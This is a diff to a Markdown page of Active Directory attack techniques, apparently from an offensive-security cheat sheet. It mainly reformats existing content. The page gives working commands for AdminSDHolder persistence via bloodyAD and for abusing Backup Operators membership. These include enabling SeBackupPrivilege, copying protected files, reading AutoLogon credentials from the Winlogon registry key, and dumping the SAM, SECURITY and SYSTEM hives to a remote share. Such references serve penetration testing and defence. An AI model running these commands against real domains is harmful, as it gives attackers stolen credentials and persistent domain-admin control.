@@ -28,7 +28,9 @@ Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
 > The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all "protected groups" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.
 
 If you modify the permissions of **AdminSDHolder**, that permission template will be pushed out to all protected accounts automatically by `SDProp` (in an hour).
+
 E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.
+
 * Windows/Linux:
   ```ps1
   bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 add genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john
@@ -36,6 +38,7 @@ E.g: if someone tries to delete this user from the Domain Admins in an hour or l
   # Clean up after
   bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 remove genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john
   ```
+
 * Windows only:
   ```ps1
   # Add a user to the AdminSDHolder group:
@@ -99,36 +102,46 @@ This groups grants the following privileges :
 - SeBackup privileges
 - SeRestore privileges
 
-* Get members of the group:
-  * Windows/Linux:
+Get members of the group:
+
+* Windows/Linux:
     ```ps1
     bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object "Backup Operators" --attr msds-memberTransitive
     ```
-  * Windows only:
+
+* Windows only:
     ```ps1
     PowerView> Get-NetGroupMember -Identity "Backup Operators" -Recurse
     ```
-* Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
-  ```ps1
-  Import-Module .\SeBackupPrivilegeUtils.dll
-  Import-Module .\SeBackupPrivilegeCmdLets.dll
 
-  Set-SeBackupPrivilege
-  Get-SeBackupPrivilege
-  ```
-* Retrieve sensitive files
-  ```ps1
-  Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
-  ```
-* Retrieve content of AutoLogon in the HKLM\SOFTWARE hive
-  ```ps1
-  $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
-  $winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
-  $winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
-  ```
-* Retrieve SAM,SECURITY and SYSTEM hives
-  * [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA): `.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\`
-  * [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit): `.\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK`
+Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
+
+```ps1
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+```
+
+Retrieve sensitive files
+
+```ps1
+Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
+```
+
+Retrieve content of AutoLogon in the `HKLM\SOFTWARE` hive
+
+```ps1
+$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
+$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
+$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
+```
+
+Retrieve `SAM`,`SECURITY` and `SYSTEM` hives
+
+* [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA): `.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\`
+* [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit): `.\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK`
 
 
 ## References
